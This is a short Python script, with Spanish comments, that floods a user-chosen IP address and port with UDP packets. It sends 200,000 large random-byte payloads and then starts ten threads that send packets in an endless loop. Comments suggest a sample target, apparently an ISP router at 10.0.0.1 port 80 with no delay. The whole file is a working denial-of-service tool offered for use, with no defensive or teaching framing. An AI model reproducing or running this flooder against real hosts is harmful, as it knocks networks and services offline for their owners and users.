import socket
import threading
import random
import time



s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
ip = input("Target Ip")
port = int(input("Target port"))
sleep = float(input("sleep"))


s.connect((ip, port))


for i in range(1,100*2000):
    s.send(random._urandom(10)*2000)
    print(f"send:{i}", end='\r')

    time.sleep(sleep)
    
def send_packets():
    while True:
        s.send(random._urandom(1024))
        time.sleep(sleep)

# Crear y ejecutar múltiples hilos
#ejemplo de ip para claro 10.0.0.1
#puerto 80
#sleep 0
num_threads = 10  # Núme10ro de hilos
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=send_packets)
    threads.append(t)
    t.start()    